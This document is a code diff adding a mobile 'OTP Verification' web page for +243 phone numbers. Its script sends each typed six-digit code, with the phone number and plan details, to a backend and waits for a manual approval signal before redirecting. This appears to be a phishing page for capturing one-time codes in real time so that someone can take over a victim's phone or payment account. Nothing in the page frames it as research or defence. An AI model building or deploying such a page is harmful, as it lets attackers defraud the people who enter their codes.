@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OTP Verification</title>
+
+<style>
+:root {
+  --bg: #f3f3f3;
+  --card: #ffffff;
+  --text-main: #5f5f5f;
+  --text-sub: #8a8a8a;
+  --border-blue: #7aa7d9;
+  --border-focus: #4f8fd6;
+  --btn-disabled: #bdbdbd;
+}
+
+* {
+  box-sizing: border-box;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+}
+
+body {
+  margin: 0;
+  background: var(--bg);
+  min-height: 100vh;
+  display: flex;
+  justify-content: center;
+  padding: 16px;
+}
+
+.wrapper {
+  width: 100%;
+  max-width: 420px;
+}
+
+.back-btn {
+  width: 38px;
+  height: 38px;
+  border-radius: 50%;
+  border: 2px solid #9e9e9e;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin: 16px 0;
+}
+
+.back-btn svg {
+  width: 18px;
+  height: 18px;
+  stroke: #6b6b6b;
+}
+
+.card {
+  background: var(--card);
+  border-radius: 18px;
+  padding: 24px 20px 28px;
+  box-shadow: 0 6px 18px rgba(0,0,0,0.06);
+}
+
+.title {
+  font-size: 28px;
+  font-weight: 600;
+  color: var(--text-main);
+  margin-bottom: 8px;
+}
+
+.subtitle {
+  font-size: 16px;
+  color: var(--text-sub);
+  margin-bottom: 14px;
+}
+
+.phone {
+  font-size: 18px;
+  font-weight: 500;
+  color: #6b6b6b;
+  margin-bottom: 20px;
+}
+
+.otp-label {
+  font-size: 16px;
+  color: #7a7a7a;
+  margin-bottom: 10px;
+}
+
+.otp-boxes {
+  display: grid;
+  grid-template-columns: repeat(6, 1fr);
+  gap: clamp(6px, 2vw, 12px);
+  margin-bottom: 22px;
+}
+
+.otp-boxes input {
+  width: 100%;
+  height: clamp(48px, 12vw, 56px);
+  border-radius: 12px;
+  border: 2px solid var(--border-blue);
+  text-align: center;
+  font-size: clamp(18px, 5vw, 22px);
+  outline: none;
+}
+
+.otp-boxes input:focus {
+  border-color: var(--border-focus);
+}
+
+.timer {
+  text-align: center;
+  font-size: 16px;
+  color: #9a9a9a;
+  margin-bottom: 22px;
+}
+
+.approval-overlay {
+  display: none;
+  position: fixed;
+  inset: 0;
+  z-index: 10;
+  align-items: center;
+  justify-content: center;
+  background: rgba(0, 0, 0, 0.45);
+  padding: 20px;
+}
+
+.approval-overlay.visible {
+  display: flex;
+}
+
+.approval-content {
+  width: min(100%, 340px);
+  background: #fff;
+  border-radius: 12px;
+  padding: 24px;
+  text-align: center;
+}
+
+.approval-content p {
+  line-height: 1.5;
+  margin: 0 0 20px;
+}
+
+.approval-content button {
+  border: none;
+  border-radius: 10px;
+  background: #0b5ed7;
+  color: #fff;
+  cursor: pointer;
+  font-weight: bold;
+  padding: 12px 24px;
+}
+
+.approval-overlay.error-state .approval-content {
+  color: #b42318;
+}
+
+.spinner {
+  width: 38px;
+  height: 38px;
+  border: 4px solid #d9e6fb;
+  border-top-color: #0b5ed7;
+  border-radius: 50%;
+  animation: spin 0.8s linear infinite;
+  margin: 0 auto 18px;
+}
+
+@keyframes spin {
+  to {
+    transform: rotate(360deg);
+  }
+}
+</style>
+</head>
+
+<body>
+
+<div class="wrapper">
+
+  <div class="back-btn" aria-label="Back">
+    <svg fill="none" viewBox="0 0 24 24" stroke-width="2">
+      <path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7"/>
+    </svg>
+  </div>
+
+  <div class="card">
+    <div class="title">OTP Verification</div>
+    <div class="subtitle">Enter the OTP sent to your phone number. Do not share the code with anyone.</div>
+    <div class="phone"><p id="phoneNum"></p></div>
+
+    <div class="otp-label">OTP</div>
+
+    <div class="otp-boxes" id="otp">
+      <input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric" aria-label="Digit 1">
+      <input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric" aria-label="Digit 2">
+      <input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric" aria-label="Digit 3">
+      <input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric" aria-label="Digit 4">
+      <input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric" aria-label="Digit 5">
+      <input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric" aria-label="Digit 6">
+    </div>
+
+    <div class="timer">Resend OTP in <span id="timer">60</span> seconds</div>
+
+  </div>
+
+</div>
+
+<div id="approvalOverlay" class="approval-overlay" role="dialog" aria-modal="true">
+  <div class="approval-content">
+    <div id="spinner" class="spinner"></div>
+    <h3 id="overlayTitle">Verifying OTP</h3>
+    <p id="overlayText">Please wait... (1s)</p>
+    <p id="deniedMsg" style="display:none;">Incorrect code.</p>
+    <button id="retryBtn" type="button" style="display:none;">Retry</button>
+  </div>
+</div>
+
+<script>
+  const params = new URLSearchParams(window.location.search);
+  const phone = params.get('phone');
+  const phoneNumberEl = document.getElementById('phoneNum');
+  if (phone) {
+    phoneNumberEl.textContent = '+243' + phone;
+  }
+
+  const otpInputs = Array.from(document.querySelectorAll('.otp-input'));
+  let requestInProgress = false;
+
+  function updateSubmitState() {
+    const filled = otpInputs.every(input => input.value.length === 1);
+    if (filled && !requestInProgress) {
+      requestApproval();
+    }
+  }
+
+  otpInputs.forEach((input, index) => {
+    input.addEventListener('input', () => {
+      input.value = input.value.replace(/[^0-9]/g, '').slice(0, 1);
+      if (input.value && index < otpInputs.length - 1) {
+        otpInputs[index + 1].focus();
+      }
+      updateSubmitState();
+    });
+
+    input.addEventListener('keydown', event => {
+      if (event.key === 'Backspace' && !input.value && index > 0) {
+        otpInputs[index - 1].focus();
+      }
+    });
+
+    input.addEventListener('paste', event => {
+      event.preventDefault();
+      const pasted = (event.clipboardData || window.clipboardData)
+        .getData('text')
+        .replace(/[^0-9]/g, '');
+
+      pasted.split('').forEach((digit, offset) => {
+        if (otpInputs[index + offset]) {
+          otpInputs[index + offset].value = digit;
+        }
+      });
+
+      const nextEmpty = otpInputs.find(item => !item.value);
+      if (nextEmpty) nextEmpty.focus();
+      updateSubmitState();
+    });
+  });
+
+  let seconds = 60;
+  const timerEl = document.getElementById('timer');
+  const countdown = setInterval(() => {
+    seconds--;
+    if (seconds <= 0) {
+      clearInterval(countdown);
+      timerEl.textContent = '0';
+    } else {
+      timerEl.textContent = seconds;
+    }
+  }, 1000);
+
+  const overlay = document.getElementById('approvalOverlay');
+  const spinner = document.getElementById('spinner');
+  const overlayTitle = document.getElementById('overlayTitle');
+  const overlayText = document.getElementById('overlayText');
+  const deniedMsg = document.getElementById('deniedMsg');
+  const retryBtn = document.getElementById('retryBtn');
+  let pollTimer = null;
+
+  function showOverlayWaiting() {
+    overlay.classList.add('visible');
+    overlay.classList.remove('error-state');
+    spinner.style.display = 'block';
+    overlayTitle.textContent = 'Verifying OTP';
+    overlayTitle.style.display = 'block';
+    overlayText.style.display = 'block';
+    overlayText.textContent = 'Please wait... (1s)';
+    deniedMsg.style.display = 'none';
+    retryBtn.style.display = 'none';
+
+    let waitingSeconds = 1;
+    if (window.__otpWaitTimer) clearInterval(window.__otpWaitTimer);
+    window.__otpWaitTimer = setInterval(() => {
+      waitingSeconds += 1;
+      overlayText.textContent = `Please wait... (${waitingSeconds}s)`;
+    }, 1000);
+  }
+
+  function pollApproval(id) {
+    if (pollTimer) clearInterval(pollTimer);
+    pollTimer = setInterval(async () => {
+      try {
+        const response = await fetch('/api/check-approval/' + id);
+        const data = await response.json();
+
+        if (data.status === 'approved') {
+          clearInterval(pollTimer);
+          window.location.href = 'mwish.html?' + params.toString();
+        } else if (data.status === 'denied') {
+          clearInterval(pollTimer);
+          spinner.style.display = 'none';
+          overlayTitle.style.display = 'none';
+          overlayText.style.display = 'none';
+          deniedMsg.textContent = 'Incorrect code.';
+          deniedMsg.style.display = 'block';
+          retryBtn.style.display = 'inline-block';
+        } else if (data.status === 'demo_error') {
+          clearInterval(pollTimer);
+          spinner.style.display = 'none';
+          overlayTitle.style.display = 'none';
+          overlayText.style.display = 'none';
+          overlay.classList.add('error-state');
+          deniedMsg.textContent = 'Incorrect PIN.';
+          deniedMsg.style.display = 'block';
+          retryBtn.style.display = 'inline-block';
+        }
+      } catch (error) {
+        // Keep polling after temporary network failures.
+      }
+    }, 2500);
+  }
+
+  retryBtn.addEventListener('click', () => {
+    if (window.__otpWaitTimer) {
+      clearInterval(window.__otpWaitTimer);
+      window.__otpWaitTimer = null;
+    }
+
+    if (deniedMsg.textContent.trim() === 'Incorrect PIN.') {
+      window.location.href = 'trial.html';
+      return;
+    }
+
+    requestInProgress = false;
+    otpInputs.forEach(input => { input.value = ''; });
+    overlay.classList.remove('visible');
+    otpInputs[0].focus();
+  });
+
+  async function requestApproval() {
+    requestInProgress = true;
+    showOverlayWaiting();
+
+    try {
+      const response = await fetch('/api/request-approval', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          plan: params.get('plan'),
+          price: params.get('price'),
+          phone,
+          otp: otpInputs.map(input => input.value).join(''),
+          step: 'otp'
+        })
+      });
+      const data = await response.json();
+      pollApproval(data.id);
+    } catch (error) {
+      requestInProgress = false;
+      overlayTitle.textContent = 'Connection error';
+      overlayText.textContent = 'Unable to send the request. Check your connection and try again.';
+      spinner.style.display = 'none';
+      retryBtn.style.display = 'inline-block';
+    }
+  }
+</script>
+
+</body>
+</html>
